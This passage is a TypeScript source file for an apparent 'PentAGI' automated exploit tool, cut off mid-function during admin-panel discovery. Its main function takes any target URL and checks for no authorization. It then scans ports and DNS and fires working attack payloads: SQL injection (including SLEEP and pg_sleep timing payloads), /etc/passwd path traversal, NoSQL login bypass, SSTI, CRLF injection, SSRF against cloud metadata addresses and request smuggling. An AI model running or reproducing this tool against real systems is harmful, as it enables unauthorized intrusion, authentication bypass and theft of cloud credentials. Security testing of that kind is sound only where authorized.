import net from 'net';
import tls from 'tls';

type AgentName = 'Scout Agent' | 'Exploiter Agent' | 'Reporter Agent';
export type PentagiLogEntry = { time: string; agent: AgentName; msg: string };
type FindingEntry = { severity: 'critical' | 'high' | 'medium' | 'low'; title: string };

async function probePort(host: string, port: number, timeoutMs = 1500): Promise<boolean> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let done = false;
    const finish = (result: boolean) => {
      if (done) return;
      done = true;
      socket.destroy();
      resolve(result);
    };
    socket.setTimeout(timeoutMs);
    socket.once('connect', () => finish(true));
    socket.once('timeout', () => finish(false));
    socket.once('error', () => finish(false));
    socket.connect(port, host);
  });
}

async function getSslCertInfo(hostname: string): Promise<{ issuer: string; expires: string; daysLeft: number } | null> {
  return new Promise((resolve) => {
    const socket = tls.connect(
      { host: hostname, port: 443, servername: hostname, rejectUnauthorized: false },
      () => {
        const cert = socket.getPeerCertificate();
        socket.destroy();
        if (cert?.valid_to) {
          const expires = new Date(cert.valid_to);
          const daysLeft = Math.floor((expires.getTime() - Date.now()) / 86400000);
          resolve({
            issuer: (cert.issuer?.O as string) || (cert.issuer?.CN as string) || 'Unknown',
            expires: expires.toISOString().split('T')[0],
            daysLeft,
          });
        } else {
          resolve(null);
        }
      }
    );
    socket.once('error', () => resolve(null));
    socket.setTimeout(5000, () => { socket.destroy(); resolve(null); });
  });
}

async function httpProbe(
  url: string,
  init: RequestInit = {},
  timeoutMs = 4000
): Promise<{ status: number; body: string; headers: Record<string, string> } | null> {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
    const res = await fetch(url, { ...init, signal: ctrl.signal });
    clearTimeout(timer);
    const body = await res.text().catch(() => '');
    const headers: Record<string, string> = {};
    res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
    return { status: res.status, body, headers };
  } catch {
    return null;
  }
}

async function httpProbeWithTiming(
  url: string,
  init: RequestInit = {},
  timeoutMs = 8000
): Promise<{ status: number; body: string; headers: Record<string, string>; elapsedMs: number } | null> {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
    const tStart = Date.now();
    const res = await fetch(url, { ...init, signal: ctrl.signal });
    const elapsedMs = Date.now() - tStart;
    clearTimeout(timer);
    const body = await res.text().catch(() => '');
    const headers: Record<string, string> = {};
    res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
    return { status: res.status, body, headers, elapsedMs };
  } catch (e: any) {
    const elapsedMs = Date.now();
    // AbortError means we hit the timeout — record it as a timing data point
    if (e?.name === 'AbortError') return { status: 0, body: '', headers: {}, elapsedMs: timeoutMs };
    return null;
  }
}

// Attempt DNS zone transfer (AXFR) via raw TCP DNS query
async function attemptAxfr(ns: string, zone: string): Promise<boolean> {
  return new Promise((resolve) => {
    const sock = new net.Socket();
    let resolved = false;
    const done = (result: boolean) => {
      if (!resolved) { resolved = true; sock.destroy(); resolve(result); }
    };

    // Build DNS AXFR query
    const labels = zone.split('.').flatMap(part => {
      const b = Buffer.from(part, 'ascii');
      return [b.length, ...b];
    });
    const qName = Buffer.from([...labels, 0]);
    const header = Buffer.alloc(12);
    header.writeUInt16BE(0x1337, 0); // txid
    header.writeUInt16BE(0, 2);      // standard query, no flags
    header.writeUInt16BE(1, 4);      // QDCOUNT = 1
    const footer = Buffer.from([0, 252, 0, 1]); // QTYPE=AXFR(252), QCLASS=IN(1)
    const query = Buffer.concat([header, qName, footer]);
    const lenBuf = Buffer.alloc(2);
    lenBuf.writeUInt16BE(query.length, 0);
    const tcpMsg = Buffer.concat([lenBuf, query]);

    let totalBytes = 0;
    sock.setTimeout(4000);
    sock.once('timeout', () => done(false));
    sock.once('error', () => done(false));
    sock.on('data', (chunk) => {
      totalBytes += chunk.length;
      if (totalBytes > 200) done(true); // substantial response = zone data returned
    });
    sock.connect(53, ns, () => sock.write(tcpMsg));
    setTimeout(() => done(false), 5000);
  });
}

export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]> {
  const logs: PentagiLogEntry[] = [];
  const findings: FindingEntry[] = [];
  const t0 = Date.now();

  const log = (agent: AgentName, msg: string) => {
    const ms = Date.now() - t0;
    const time = `${String(Math.floor(ms / 60000)).padStart(2, '0')}:${String(Math.floor((ms % 60000) / 1000)).padStart(2, '0')}`;
    logs.push({ time, agent, msg });
    console.log(`[PentAGI][${time}] ${agent}: ${msg}`);
  };

  let targetUrl = url.trim();
  if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;

  let parsed: URL;
  try {
    parsed = new URL(targetUrl);
  } catch {
    log('Reporter Agent', `Invalid target URL: ${url}`);
    return logs;
  }

  const hostname = parsed.hostname;
  const origin = parsed.origin;
  const isHttps = parsed.protocol === 'https:';

  // ==========================================================
  // STAGE 1: SCOUT AGENT — RECONNAISSANCE
  // ==========================================================

  log('Scout Agent', `Initiating active reconnaissance against ${targetUrl}`);

  const discoveredNs: string[] = [];

  // 1a. DNS enumeration
  try {
    const dns = await import('dns/promises');
    const [aRecs, nsRecs, mxRecs, txtRecs] = await Promise.allSettled([
      dns.resolve4(hostname),
      dns.resolveNs(hostname),
      dns.resolveMx(hostname),
      dns.resolveTxt(hostname),
    ]);

    const ip = aRecs.status === 'fulfilled' ? aRecs.value[0] : 'unresolved';
    log('Scout Agent', `DNS resolved: ${hostname} → ${ip}`);

    if (nsRecs.status === 'fulfilled' && nsRecs.value.length > 0) {
      discoveredNs.push(...nsRecs.value.slice(0, 2));
      log('Scout Agent', `Nameservers: ${discoveredNs.join(', ')}`);
    }

    if (mxRecs.status === 'fulfilled' && mxRecs.value.length > 0) {
      log('Scout Agent', `Mail infrastructure: ${mxRecs.value[0].exchange} (priority ${mxRecs.value[0].priority})`);
    }

    if (txtRecs.status === 'fulfilled') {
      const spf = txtRecs.value.find(r => r.join('').startsWith('v=spf1'));
      if (!spf) {
        log('Scout Agent', 'No SPF record found — domain may be spoofable for phishing campaigns');
        findings.push({ severity: 'medium', title: 'Missing SPF Record (Email Spoofing Risk)' });
      } else {
        log('Scout Agent', `SPF record present: ${spf.join('').substring(0, 80)}`);
      }
      const dmarc = txtRecs.value.find(r => r.join('').startsWith('v=DMARC1'));
      if (!dmarc) {
        log('Scout Agent', 'No DMARC record — no policy enforcement for spoofed emails');
        findings.push({ severity: 'low', title: 'Missing DMARC Record' });
      }
    }
  } catch (e: any) {
    log('Scout Agent', `DNS enumeration failed: ${e.message}`);
  }

  // 1b. DNS Zone Transfer (AXFR) attempt against discovered nameservers
  if (discoveredNs.length > 0) {
    log('Scout Agent', `Attempting DNS zone transfer (AXFR) against ${discoveredNs[0]}...`);
    const axfrWorked = await attemptAxfr(discoveredNs[0], hostname);
    if (axfrWorked) {
      log('Scout Agent', `DNS zone transfer CONFIRMED on ${discoveredNs[0]} — full zone data returned to unauthenticated requester`);
      findings.push({ severity: 'high', title: `DNS Zone Transfer (AXFR) Allowed on ${discoveredNs[0]}` });
    } else {
      log('Scout Agent', 'DNS zone transfer: AXFR correctly restricted by nameserver');
    }
  }

  // 1c. TCP port scan (parallel, all within ~1.5s)
  const portsToScan: Array<[number, string]> = [
    [21, 'FTP'], [22, 'SSH'], [23, 'Telnet'], [25, 'SMTP'],
    [80, 'HTTP'], [443, 'HTTPS'], [3000, 'Dev-HTTP'], [3306, 'MySQL'],
    [5432, 'PostgreSQL'], [6379, 'Redis'], [8080, 'HTTP-Alt'],
    [8443, 'HTTPS-Alt'], [8888, 'Jupyter/Dev'], [9200, 'Elasticsearch'],
    [27017, 'MongoDB'],
  ];

  log('Scout Agent', `TCP port scan: probing ${portsToScan.length} common service ports on ${hostname}...`);

  const portResults = await Promise.all(
    portsToScan.map(async ([port, service]) => ({ port, service, open: await probePort(hostname, port) }))
  );
  const openPorts = portResults.filter(r => r.open);

  if (openPorts.length > 0) {
    log('Scout Agent', `Open ports confirmed: ${openPorts.map(r => `${r.port}/${r.service}`).join(', ')}`);
    for (const { port, service } of openPorts) {
      if (port === 23) {
        log('Scout Agent', `CRITICAL: Telnet (${port}/${service}) internet-exposed — cleartext credential protocol`);
        findings.push({ severity: 'critical', title: 'Telnet Service Internet-Exposed' });
      }
      if (port === 6379) {
        log('Scout Agent', `HIGH: Redis (${port}) internet-facing — typically unauthenticated by default`);
        findings.push({ severity: 'high', title: 'Redis Exposed Without Authentication' });
      }
      if (port === 27017) {
        log('Scout Agent', `HIGH: MongoDB (${port}) internet-facing — default installs lack auth`);
        findings.push({ severity: 'high', title: 'MongoDB Exposed on Internet' });
      }
      if (port === 9200) {
        log('Scout Agent', `HIGH: Elasticsearch (${port}) reachable — unauthenticated REST API possible`);
        findings.push({ severity: 'high', title: 'Elasticsearch Exposed on Internet' });
      }
      if (port === 3306 || port === 5432) {
        log('Scout Agent', `HIGH: ${service} (${port}) internet-accessible — databases should not be publicly reachable`);
        findings.push({ severity: 'high', title: `${service} Database Port Exposed on Internet` });
      }
      if (port === 8888) {
        log('Scout Agent', `MEDIUM: Jupyter/Dev server (${port}) reachable — often runs unauthenticated`);
        findings.push({ severity: 'medium', title: 'Jupyter Notebook / Dev Server Port Exposed' });
      }
    }
  } else {
    log('Scout Agent', 'Port scan complete — no unexpected services exposed beyond standard HTTP/HTTPS');
  }

  // 1d. SSL/TLS certificate inspection
  if (isHttps) {
    const cert = await getSslCertInfo(hostname);
    if (cert) {
      if (cert.daysLeft < 0) {
        log('Scout Agent', `CRITICAL: SSL certificate EXPIRED ${Math.abs(cert.daysLeft)} days ago (${cert.expires})`);
        findings.push({ severity: 'critical', title: 'SSL Certificate Expired' });
      } else if (cert.daysLeft < 14) {
        log('Scout Agent', `HIGH: Certificate expires in ${cert.daysLeft} days on ${cert.expires}`);
        findings.push({ severity: 'high', title: 'SSL Certificate Expiring Imminently (< 14 days)' });
      } else if (cert.daysLeft < 30) {
        log('Scout Agent', `MEDIUM: Certificate expires in ${cert.daysLeft} days — renewal required soon`);
        findings.push({ severity: 'medium', title: 'SSL Certificate Expiring Soon (< 30 days)' });
      } else {
        log('Scout Agent', `TLS cert valid: issued by ${cert.issuer}, expires ${cert.expires} (${cert.daysLeft}d remaining)`);
      }
    } else {
      log('Scout Agent', 'Could not inspect TLS certificate — may be self-signed or not using port 443');
    }
  }

  // 1e. Robots.txt path disclosure
  const robotsRes = await httpProbe(`${origin}/robots.txt`);
  if (robotsRes?.status === 200) {
    const disallowed = (robotsRes.body.match(/^Disallow:\s*(.+)$/gim) || []).slice(0, 6);
    if (disallowed.length > 0) {
      log('Scout Agent', `robots.txt discloses ${disallowed.length} restricted paths: ${disallowed.join(', ')}`);
    } else {
      log('Scout Agent', 'robots.txt present — no sensitive paths disclosed');
    }
  }

  // 1f. security.txt (RFC 9116)
  const secTxtRes = await httpProbe(`${origin}/.well-known/security.txt`);
  if (secTxtRes?.status === 200 && secTxtRes.body.includes('Contact:')) {
    log('Scout Agent', 'security.txt present — responsible disclosure policy configured (RFC 9116)');
  }

  // 1g. Subdomain takeover via certificate transparency (crt.sh)
  log('Scout Agent', `Querying CT logs for ${hostname} subdomains — checking for dangling DNS...`);
  try {
    const crtRes = await httpProbe(`https://crt.sh/?q=%.${hostname}&output=json`, {}, 6000);
    if (crtRes?.status === 200) {
      let crtData: any[] = [];
      try { crtData = JSON.parse(crtRes.body); } catch {}
      const subdomains = [...new Set<string>(
        crtData
          .flatMap((e: any) => (e.name_value || '').split('\n'))
          .map((n: string) => n.toLowerCase().replace(/^\*\./, ''))
          .filter((n: string) => n.endsWith(`.${hostname}`) && !n.includes('*') && n !== hostname)
      )].slice(0, 12);

      if (subdomains.length > 0) {
        log('Scout Agent', `CT logs: ${subdomains.length} unique subdomains discovered — probing for takeover vectors...`);
        const TAKEOVER_FINGERPRINTS: Array<{ re: RegExp; service: string }> = [
          { re: /There isn't a GitHub Pages site here/i, service: 'GitHub Pages' },
          { re: /No such app/i, service: 'Heroku' },
          { re: /Fastly error.*unknown domain/i, service: 'Fastly' },
          { re: /NoSuchBucket|The specified bucket does not exist/i, service: 'AWS S3' },
          { re: /Repository not found/i, service: 'Bitbucket' },
          { re: /404 not found.*netlify|netlify.*404/i, service: 'Netlify' },
          { re: /Error 404.*Web app not found|Azure.*not found/i, service: 'Azure Web Apps' },
          { re: /project not found/i, service: 'Firebase' },
          { re: /Shopify.*ended up here by mistake/i, service: 'Shopify' },
          { re: /Sorry, this shop is currently unavailable/i, service: 'Shopify' },
        ];
        const dns2 = await import('dns/promises');
        let takeoverCount = 0;
        await Promise.all(subdomains.slice(0, 10).map(async (sub) => {
          let resolvesA = false;
          let cname: string | null = null;
          try { await dns2.resolve4(sub); resolvesA = true; } catch {}
          try { const c = await dns2.resolveCname(sub); cname = c[0]; } catch {}

          if (!resolvesA && cname) {
            // Dangling CNAME — CNAME target exists but no A record
            const subProbe = await httpProbe(`https://${sub}`, {}, 5000);
            if (subProbe) {
              for (const { re, service } of TAKEOVER_FINGERPRINTS) {
                if (re.test(subProbe.body)) {
                  log('Scout Agent', `Subdomain takeover CONFIRMED: ${sub} → ${cname} (${service} fingerprint detected)`);
                  findings.push({ severity: 'critical', title: `Subdomain Takeover: ${sub} via ${service}` });
                  takeoverCount++;
                  break;
                }
              }
            }
          }
        }));
        if (takeoverCount === 0) {
          log('Scout Agent', 'Subdomain takeover analysis: no dangling DNS + cloud service fingerprint match found');
        }
      } else {
        log('Scout Agent', 'CT logs: no subdomains found for this domain');
      }
    } else {
      log('Scout Agent', 'CT logs: crt.sh did not return usable data');
    }
  } catch (e: any) {
    log('Scout Agent', `Subdomain takeover probe: CT log query failed — ${e.message}`);
  }

  // ==========================================================
  // STAGE 2: EXPLOITER AGENT — ACTIVE EXPLOIT PROBES
  // ==========================================================

  log('Exploiter Agent', `Beginning active exploit probing against ${targetUrl}`);

  // 2a. CORS origin reflection
  const corsRes = await httpProbe(targetUrl, {
    headers: { 'Origin': 'https://evil-attacker.com', 'User-Agent': 'Mozilla/5.0' },
  });
  if (corsRes) {
    const acao = corsRes.headers['access-control-allow-origin'];
    const acac = corsRes.headers['access-control-allow-credentials'];
    if (acao === '*' || acao === 'https://evil-attacker.com') {
      const sev: FindingEntry['severity'] = acac === 'true' ? 'critical' : 'high';
      log('Exploiter Agent', `CORS misconfiguration CONFIRMED: ACAO=${acao}${acac ? `, ACAC=${acac}` : ''} — ${acac === 'true' ? 'authenticated cross-origin reads possible (session hijack)' : 'cross-origin data reads enabled'}`);
      findings.push({ severity: sev, title: `CORS Misconfiguration${acac === 'true' ? ' with Credentials (Critical)' : ''}` });
    } else {
      log('Exploiter Agent', `CORS policy: ${acao ? `restricted to ${acao}` : 'no wildcard, origin not reflected'}`);
    }
  }

  // 2b. CORS deep analysis — null origin and subdomain wildcard bypass
  const [corsNullRes, corsSubRes] = await Promise.all([
    httpProbe(targetUrl, { headers: { 'Origin': 'null', 'User-Agent': 'Mozilla/5.0' } }),
    httpProbe(targetUrl, { headers: { 'Origin': `https://attacker.${hostname}`, 'User-Agent': 'Mozilla/5.0' } }),
  ]);
  if (corsNullRes?.headers['access-control-allow-origin'] === 'null') {
    log('Exploiter Agent', 'CORS null-origin CONFIRMED — sandboxed <iframe> cross-origin read attack vector enabled');
    findings.push({ severity: 'high', title: 'CORS Null-Origin Reflection (Sandboxed Iframe Attack)' });
  }
  if (corsSubRes?.headers['access-control-allow-origin'] === `https://attacker.${hostname}`) {
    log('Exploiter Agent', `CORS subdomain wildcard bypass: attacker.${hostname} accepted as trusted — subdomain XSS → full CORS bypass`);
    findings.push({ severity: 'high', title: `CORS Subdomain Bypass (attacker.${hostname})` });
  }
  if (corsNullRes && corsRes && !findings.find(f => f.title.includes('CORS'))) {
    log('Exploiter Agent', 'CORS deep check: null-origin and subdomain bypass both rejected');
  }

  // 2c. HTTP method enumeration (PUT/DELETE)
  const optionsRes = await httpProbe(targetUrl, { method: 'OPTIONS' });
  if (optionsRes) {
    const allow = (optionsRes.headers['allow'] || optionsRes.headers['access-control-allow-methods'] || '').toUpperCase();
    if (allow.includes('PUT') || allow.includes('DELETE')) {
      log('Exploiter Agent', `Dangerous HTTP methods advertised: ${allow} — PUT/DELETE may enable unauthorized writes`);
      findings.push({ severity: 'medium', title: 'Dangerous HTTP Methods Enabled (PUT/DELETE)' });
    } else {
      log('Exploiter Agent', `HTTP methods: ${allow || 'no Allow header returned'}`);
    }
  }

  // 2d. Host header injection (password reset poisoning / cache poisoning)
  const hostInjRes = await httpProbe(targetUrl, {
    headers: { 'X-Forwarded-Host': 'evil-attacker.com', 'X-Host': 'evil-attacker.com' },
  });
  if (hostInjRes) {
    const reflected =
      hostInjRes.body.includes('evil-attacker.com') ||
      (hostInjRes.headers['location'] || '').includes('evil-attacker.com');
    if (reflected) {
      log('Exploiter Agent', 'Host header injection CONFIRMED — X-Forwarded-Host reflected in response (password reset/cache poisoning vector)');
      findings.push({ severity: 'high', title: 'Host Header Injection (Password Reset Poisoning)' });
    } else {
      log('Exploiter Agent', 'Host header injection: X-Forwarded-Host not reflected');
    }
  }

  // 2e. Open redirect probing
  const redirectParams = ['next', 'redirect', 'url', 'return', 'returnUrl', 'redir', 'goto', 'continue'];
  let redirectFound = false;
  for (const param of redirectParams) {
    const rRes = await httpProbe(`${targetUrl}?${param}=//evil-attacker.com`, { redirect: 'manual' });
    if (rRes && (rRes.headers['location'] || '').includes('evil-attacker.com')) {
      log('Exploiter Agent', `Open redirect CONFIRMED: ?${param}= → ${rRes.headers['location']}`);
      findings.push({ severity: 'medium', title: `Open Redirect via ?${param} Parameter` });
      redirectFound = true;
      break;
    }
  }
  if (!redirectFound) log('Exploiter Agent', 'Open redirect: no vulnerable redirect parameters detected');

  // 2f. CRLF injection / HTTP response splitting
  const crlfRes = await httpProbe(`${targetUrl}?q=test%0d%0aX-Injected:seclayer-probe%0d%0a`);
  if (crlfRes?.headers['x-injected']) {
    log('Exploiter Agent', 'CRLF injection CONFIRMED — injected HTTP header present in response (HTTP response splitting)');
    findings.push({ severity: 'high', title: 'CRLF Injection / HTTP Response Splitting' });
  } else {
    log('Exploiter Agent', 'CRLF injection: input appears sanitized');
  }

  // 2g. Path traversal / Local File Inclusion
  const traversalPayloads = [
    `${origin}/..%2F..%2F..%2Fetc%2Fpasswd`,
    `${origin}/%2e%2e/%2e%2e/%2e%2e/etc/passwd`,
    `${targetUrl}?file=../../../../etc/passwd`,
    `${targetUrl}?page=../../../etc/passwd`,
  ];
  let traversalFound = false;
  for (const payload of traversalPayloads) {
    const tRes = await httpProbe(payload);
    if (tRes && (tRes.body.includes('root:x:') || tRes.body.includes('/bin/bash') || tRes.body.includes('daemon:'))) {
      log('Exploiter Agent', `LFI CONFIRMED: /etc/passwd readable via ${payload}`);
      findings.push({ severity: 'critical', title: 'Local File Inclusion (LFI) — /etc/passwd Readable' });
      traversalFound = true;
      break;
    }
  }
  if (!traversalFound) log('Exploiter Agent', 'Path traversal: no LFI confirmed via common payloads');

  // 2h. GraphQL introspection
  const gqlRes = await httpProbe(`${origin}/graphql`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: '{__schema{types{name}}}' }),
  });
  if (gqlRes && (gqlRes.body.includes('__schema') || gqlRes.body.includes('__Type'))) {
    log('Exploiter Agent', 'GraphQL introspection ENABLED — full schema extractable without authentication');
    findings.push({ severity: 'high', title: 'GraphQL Schema Introspection Exposed' });
  } else {
    log('Exploiter Agent', gqlRes?.status === 200 ? 'GraphQL present but introspection disabled' : 'No GraphQL endpoint at /graphql');
  }

  // 2i. SQL injection (error-based)
  const sqliProbes = [
    { probe: `${targetUrl}?id='`, label: "single-quote boundary" },
    { probe: `${targetUrl}?id=1 AND 1=2 UNION SELECT NULL--`, label: "UNION-based" },
    { probe: `${targetUrl}?search=') OR ('1'='1`, label: "boolean-based" },
  ];
  let sqliFound = false;
  for (const { probe, label } of sqliProbes) {
    const sqliRes = await httpProbe(probe);
    if (sqliRes) {
      const b = sqliRes.body.toLowerCase();
      if (b.includes('syntax error') || b.includes('sql syntax') || b.includes('ora-') ||
          b.includes('mysql_fetch') || b.includes('unclosed quotation') || b.includes('unterminated quoted')) {
        log('Exploiter Agent', `SQL injection CONFIRMED via ${label} — database error reflected in HTTP response`);
        findings.push({ severity: 'critical', title: 'SQL Injection (Error-Based)' });
        sqliFound = true;
        break;
      }
    }
  }
  if (!sqliFound) log('Exploiter Agent', 'SQL injection: no error-based reflection detected');

  // 2j. Timing-based blind SQL injection (parallel multi-DB probes)
  log('Exploiter Agent', 'Probing for time-based blind SQL injection (5-second delay payloads)...');
  const baselineProbe = await httpProbeWithTiming(targetUrl, {}, 5000);
  const baselineMs = baselineProbe?.elapsedMs ?? 400;
  const DELAY_THRESHOLD_MS = 4000;

  const [timingMySQL, timingMSSQL, timingPg] = await Promise.all([
    httpProbeWithTiming(`${targetUrl}?id=1' AND SLEEP(5)--+-`, {}, 8000),
    httpProbeWithTiming(`${targetUrl}?id=1; WAITFOR DELAY '0:0:5'--`, {}, 8000),
    httpProbeWithTiming(`${targetUrl}?id=1 OR pg_sleep(5)--`, {}, 8000),
  ]);
  const timingProbes = [
    { r: timingMySQL, label: 'MySQL SLEEP()' },
    { r: timingMSSQL, label: 'MSSQL WAITFOR DELAY' },
    { r: timingPg, label: 'PostgreSQL pg_sleep()' },
  ];
  let timingSqliFound = false;
  for (const { r, label } of timingProbes) {
    if (r && r.elapsedMs > baselineMs + DELAY_THRESHOLD_MS) {
      log('Exploiter Agent', `Blind SQLi CONFIRMED (${label}): ${r.elapsedMs}ms response vs ${baselineMs}ms baseline — ${r.elapsedMs - baselineMs}ms injected delay`);
      findings.push({ severity: 'critical', title: `Blind SQL Injection (Time-Based, ${label})` });
      timingSqliFound = true;
      break;
    }
  }
  if (!timingSqliFound) {
    log('Exploiter Agent', `Time-based SQLi: no delay anomaly detected (baseline ${baselineMs}ms, threshold +${DELAY_THRESHOLD_MS}ms)`);
  }

  // 2k. NoSQL injection (MongoDB operator injection auth bypass)
  log('Exploiter Agent', 'Testing NoSQL operator injection (MongoDB $gt, $where auth bypass patterns)...');
  const noSqlProbes = [
    { url: `${targetUrl}?username[$gt]=&password[$gt]=`, method: 'GET' as const, body: undefined, ct: undefined, label: 'GET query[$gt]' },
    { url: `${origin}/login`, method: 'POST' as const, body: JSON.stringify({ username: { $gt: '' }, password: { $gt: '' } }), ct: 'application/json', label: '/login JSON $gt' },
    { url: `${origin}/api/login`, method: 'POST' as const, body: JSON.stringify({ username: { $gt: '' }, password: { $gt: '' } }), ct: 'application/json', label: '/api/login JSON $gt' },
    { url: `${origin}/api/auth/login`, method: 'POST' as const, body: JSON.stringify({ username: { $gt: '' }, password: { $gt: '' } }), ct: 'application/json', label: '/api/auth/login JSON $gt' },
  ];
  const noSqlResults = await Promise.all(noSqlProbes.map(async ({ url: pUrl, method, body, ct, label }) => {
    const init: RequestInit = { method };
    if (body) init.body = body;
    if (ct) init.headers = { 'Content-Type': ct };
    return { r: await httpProbe(pUrl, init), label };
  }));
  let noSqlFound = false;
  for (const { r, label } of noSqlResults) {
    if (!r || noSqlFound) continue;
    const bodyLc = r.body.toLowerCase();
    if ([200, 302].includes(r.status) && (
      bodyLc.includes('welcome') || bodyLc.includes('dashboard') ||
      bodyLc.includes('logged in') || bodyLc.includes('"success":true') ||
      bodyLc.includes('"token"') || (r.headers['set-cookie'] || '').includes('session')
    )) {
      log('Exploiter Agent', `NoSQL injection auth bypass POSSIBLE via ${label}: success response (HTTP ${r.status})`);
      findings.push({ severity: 'critical', title: `NoSQL Injection Auth Bypass (${label})` });
      noSqlFound = true;
    }
  }
  if (!noSqlFound) log('Exploiter Agent', 'NoSQL injection: no operator injection bypass detected');

  // 2l. Reflected XSS
  const xssTag = `<seclayer-xss-probe-${Date.now()}>`;
  const xssRes = await httpProbe(`${targetUrl}?q=${encodeURIComponent(xssTag)}&s=${encodeURIComponent(xssTag)}`);
  if (xssRes?.body.includes(xssTag)) {
    log('Exploiter Agent', 'Reflected XSS CONFIRMED — unencoded HTML tag reflected verbatim in response body');
    findings.push({ severity: 'high', title: 'Reflected Cross-Site Scripting (XSS)' });
  } else {
    log('Exploiter Agent', 'Reflected XSS: input encoded or not reflected');
  }

  // 2m. Server-Side Template Injection (SSTI)
  const sstiRes = await httpProbe(`${targetUrl}?name=${encodeURIComponent('{{7*7}}')}&q=${encodeURIComponent('${7*7}')}`);
  if (sstiRes && sstiRes.body.includes('49') && !sstiRes.body.includes('{{7*7}}')) {
    log('Exploiter Agent', 'SSTI POSSIBLE: template expression {{7*7}} evaluated to 49 in response');
    findings.push({ severity: 'critical', title: 'Server-Side Template Injection (SSTI)' });
  } else {
    log('Exploiter Agent', 'SSTI probe: expressions not evaluated');
  }

  // 2n. Prototype pollution via query parameters
  log('Exploiter Agent', 'Testing prototype pollution via query string injection...');
  const ppMarker = `seclayer-pp-${Date.now()}`;
  const [ppRes1, ppRes2] = await Promise.all([
    httpProbe(`${targetUrl}?__proto__[polluted]=${ppMarker}`),
    httpProbe(`${targetUrl}?constructor.prototype.polluted=${ppMarker}`),
  ]);
  let ppFound = false;
  for (const ppRes of [ppRes1, ppRes2]) {
    if (ppRes?.body.includes(ppMarker) && !ppRes.body.includes('__proto__') && !ppRes.body.includes('constructor.prototype')) {
      log('Exploiter Agent', 'Prototype pollution POSSIBLE: injected prototype key value reflected in response without key serialization');
      findings.push({ severity: 'high', title: 'Prototype Pollution via Query Parameters' });
      ppFound = true;
      break;
    }
  }
  if (!ppFound) log('Exploiter Agent', 'Prototype pollution: no unsafe prototype key reflection detected');

  // 2o. SSRF via URL-type query parameters (cloud metadata probing)
  log('Exploiter Agent', 'Probing for SSRF via URL-type parameters (cloud metadata endpoints)...');
  const ssrfParams = ['url', 'callback', 'webhook', 'endpoint', 'dest', 'proxy', 'fetch', 'image', 'src'];
  const ssrfTargets = [
    'http://169.254.169.254/latest/meta-data/',   // AWS EC2 IMDSv1
    'http://metadata.google.internal/computeMetadata/v1/',  // GCP
    'http://100.100.100.200/latest/meta-data/',   // Alibaba Cloud
  ];
  const ssrfSignatures = ['ami-id', 'instance-id', 'iam/', 'computeMetadata', 'security-credentials', 'instance-type', 'local-hostname'];
  let ssrfFound = false;
  await Promise.all(
    ssrfParams.flatMap(param =>
      ssrfTargets.map(async target => {
        if (ssrfFound) return;
        const sr = await httpProbe(`${targetUrl}?${param}=${encodeURIComponent(target)}`);
        if (sr && ssrfSignatures.some(sig => sr.body.includes(sig))) {
          log('Exploiter Agent', `SSRF CONFIRMED via ?${param}= — cloud instance metadata accessible! Credentials and RCE risk.`);
          findings.push({ severity: 'critical', title: `Server-Side Request Forgery (SSRF) via ?${param}= (Cloud Metadata)` });
          ssrfFound = true;
        }
      })
    )
  );
  if (!ssrfFound) log('Exploiter Agent', 'SSRF probe: no cloud metadata leakage detected via URL-type parameters');

  // 2p. JWT weakness detection
  log('Exploiter Agent', 'Inspecting response headers and cookies for JWT tokens...');
  const jwtProbeRes = await httpProbe(targetUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
  if (jwtProbeRes) {
    const scanText = Object.values(jwtProbeRes.headers).join(' ') + ' ' + jwtProbeRes.body.substring(0, 3000);
    const jwtMatch = scanText.match(/eyJ[A-Za-z0-9_-]{4,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*/);
    if (jwtMatch) {
      try {
        const [headerB64] = jwtMatch[0].split('.');
        const padded = headerB64 + '='.repeat((4 - headerB64.length % 4) % 4);
        const header = JSON.parse(Buffer.from(padded, 'base64url').toString('utf8'));
        if (header.alg === 'none' || header.alg === 'NONE') {
          log('Exploiter Agent', 'JWT CRITICAL: alg=none token detected — signatures accepted without verification');
          findings.push({ severity: 'critical', title: 'JWT Algorithm None Vulnerability (Signature Bypass)' });
        } else if (typeof header.alg === 'string' && header.alg.startsWith('RS')) {
          log('Exploiter Agent', `JWT uses ${header.alg} — probe for RS→HS256 algorithm confusion (sign with public key as HMAC secret)`);
          findings.push({ severity: 'medium', title: `JWT Algorithm Confusion Risk (${header.alg} → HS256 confusion)` });
        } else if (header.alg === 'HS256') {
          log('Exploiter Agent', 'JWT (HS256) found in response — verify secret entropy and check for weak/default secrets');
        } else {
          log('Exploiter Agent', `JWT detected: alg=${header.alg} — manual analysis recommended`);
        }
      } catch {
        log('Exploiter Agent', 'JWT-like token found in response — header decode failed, manual inspection needed');
      }
    } else {
      log('Exploiter Agent', 'JWT inspection: no JWT material found in initial response');
    }
  }

  // 2q. HTTP request smuggling (CL.TE timing probe)
  log('Exploiter Agent', 'Probing for HTTP request smuggling via CL.TE header desync...');
  const smuggleRes = await httpProbeWithTiming(`${origin}/`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': '44',
      'Transfer-Encoding': 'chunked',
    },
    body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n',
  }, 7000);
  if (smuggleRes && smuggleRes.elapsedMs > 5500) {
    log('Exploiter Agent', `HTTP request smuggling indicator: ${smuggleRes.elapsedMs}ms timeout with CL.TE desync payload — backend may queue poisoned prefix`);
    findings.push({ severity: 'high', title: 'HTTP Request Smuggling (CL.TE Timing Indicator)' });
  } else {
    log('Exploiter Agent', `Request smuggling: no CL.TE desync timeout (${smuggleRes?.elapsedMs ?? 'N/A'}ms)`);
  }

  // 2r. Common admin panel discovery
  const adminPaths = ['/admin', '/wp-admin', '/phpmyadmin', '/adminer', '/panel', '/dashboard/admin', '/_admin', '/console'];
  const adminFound: string[] = [];
  await Promise.all(adminPaths.map(async (p) => {
    const aRes = await httpProbe(`${origin}${p}`);
    if (aRes && aRes.status === 200 && aRes.body.length > 100) adminFound.push(p);
